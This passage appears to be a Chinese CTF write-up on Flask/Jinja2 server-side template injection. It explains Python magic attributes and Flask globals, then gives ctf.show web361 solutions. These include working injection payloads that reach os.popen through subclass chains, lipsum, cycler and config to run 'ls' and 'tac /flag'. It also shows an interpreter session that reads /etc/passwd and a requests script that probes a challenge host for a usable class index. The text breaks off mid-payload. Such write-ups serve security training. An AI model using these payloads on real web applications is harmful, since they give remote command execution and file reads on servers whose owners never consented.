类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<span class="token punctuation">.</span>操作的时候（形如：a<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        调用字典中的键值，其实就是调用这个魔术方法，比如a<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>，就是a<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。<span class="token builtin">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum<span class="token punctuation">.</span>__globals__含有os模块：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="token builtin">open</span>函数<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    get传参request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  所有参数request<span class="token punctuation">.</span>cookies      cookies参数request<span class="token punctuation">.</span>headers      请求头参数request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded或multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json post传json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               当前application的所有配置。此外，也可以这样<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>g                    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>得到<span class="token operator">&lt;</span>flask<span class="token punctuation">.</span>g of <span class="token string">'flask_ssti'</span><span class="token operator">></span></code></pre><h4 id="一些利用语句"><a href="#一些利用语句" class="headerlink" title="一些利用语句"></a>一些利用语句</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 获得一个字符串实例</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token string">''</span><span class="token comment"># 获得字符串的type实例</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__ <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token comment"># 获得其父类</span><span class="token operator">>></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token comment"># 获得父类中的object类</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token comment"># 获得object类的子类，但发现这个__subclasses__属性是个方法</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method __subclasses__ of <span class="token builtin">type</span> <span class="token builtin">object</span> at <span class="token number">0x10376d320</span><span class="token operator">></span><span class="token comment"># 使用__subclasses__()方法，获得object类的子类</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token comment"># 获得第40个子类的一个实例，即一个file实例</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token comment"># 对file初始化</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token builtin">open</span> <span class="token builtin">file</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> mode <span class="token string">'r'</span> at <span class="token number">0x10397a8a0</span><span class="token operator">></span><span class="token comment"># 使用file的read属性读取，但发现是个方法</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method read of <span class="token builtin">file</span> <span class="token builtin">object</span> at <span class="token number">0x10397a5d0</span><span class="token operator">></span><span class="token comment"># 使用read()方法读取</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>nobody<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>Unprivileged User<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>empty<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>falseroot<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>System Administrator<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>root<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh</code></pre><p>常用过滤器</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将值转换为<span class="token builtin">int</span>类型；<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将值转换为<span class="token builtin">float</span>类型；lower<span class="token punctuation">(</span><span class="token punctuation">)</span>：将字符串转换为小写；upper<span class="token punctuation">(</span><span class="token punctuation">)</span>：将字符串转换为大写；title<span class="token punctuation">(</span><span class="token punctuation">)</span>：把值中的每个单词的首字母都转成大写；capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span>：把变量值的首字母转成大写，其余字母转小写；trim<span class="token punctuation">(</span><span class="token punctuation">)</span>：截取字符串前面和后面的空白字符；wordcount<span class="token punctuation">(</span><span class="token punctuation">)</span>：计算一个长字符串中单词的个数；reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>：字符串反转；replace<span class="token punctuation">(</span>value<span class="token punctuation">,</span>old<span class="token punctuation">,</span>new<span class="token punctuation">)</span>： 替换将old替换为new的字符串；truncate<span class="token punctuation">(</span>value<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>killwords<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>：截取length长度的字符串；striptags<span class="token punctuation">(</span><span class="token punctuation">)</span>：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape<span class="token punctuation">(</span><span class="token punctuation">)</span>或e：转义字符，会将<span class="token operator">&lt;</span>、<span class="token operator">></span>等符号转义成HTML中的符号。显例：content<span class="token operator">|</span>escape或content<span class="token operator">|</span>e。safe<span class="token punctuation">(</span><span class="token punctuation">)</span>： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'&lt;em>hello&lt;/em>'</span><span class="token operator">|</span>safe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>；<span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将变量列成列表；string<span class="token punctuation">(</span><span class="token punctuation">)</span>：将变量转换成字符串；join<span class="token punctuation">(</span><span class="token punctuation">)</span>：将一个序列中的参数值拼接成字符串。示例看上面payload；<span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个数值的绝对值；first<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个序列的第一个元素；last<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个序列的最后一个元素；<span class="token builtin">format</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>arags<span class="token punctuation">,</span><span class="token operator">*</span>kwargs<span class="token punctuation">)</span>：格式化字符串。比如：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">"%s"</span> <span class="token operator">-</span> <span class="token string">"%s"</span><span class="token operator">|</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'Hello?'</span><span class="token punctuation">,</span><span class="token string">"Foo!"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>将输出：Helloo? <span class="token operator">-</span> Foo!length<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回一个序列或者字典的长度；<span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：返回列表内数值的和；sort<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回排序后的列表；default<span class="token punctuation">(</span>value<span class="token punctuation">,</span>default_value<span class="token punctuation">,</span>boolean<span class="token operator">=</span>false<span class="token punctuation">)</span>：如果当前变量没有值，则会使用参数中的值来代替。示例：name<span class="token operator">|</span>default<span class="token punctuation">(</span><span class="token string">'xiaotuo'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>如果name不存在，则会使用xiaotuo来替代。boolean<span class="token operator">=</span><span class="token boolean">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean<span class="token operator">=</span>true。也可以使用<span class="token keyword">or</span>来替换。length<span class="token punctuation">(</span><span class="token punctuation">)</span>返回字符串的长度，别名是count</code></pre><p><a href="https://www.freebuf.com/articles/web/328222.html">CTF 对SSTI的一些总结</a></p><h3 id="web361-372"><a href="#web361-372" class="headerlink" title="web361-372"></a>web361-372</h3><h4 id="web361-os-wrap-close"><a href="#web361-os-wrap-close" class="headerlink" title="web361(os._wrap_close)"></a>web361(os._wrap_close)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web361.png" loading="lazy"></p><p>也可以使用脚本查找</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://589fbc1b-7f84-4f77-97bc-d20ad9e2b2b9.challenge.ctf.show/?name=&#123;&#123;%22%22.__class__.__bases__[0].__subclasses__()['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']&#125;&#125;'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'os._wrap_close'</span> <span class="token keyword">in</span> r<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>然后利用<strong>os._wrap_close</strong>类<strong>init.globals</strong>来找os类中的。init初始化，globals全局查找</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token operator">.</span>__class__<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string 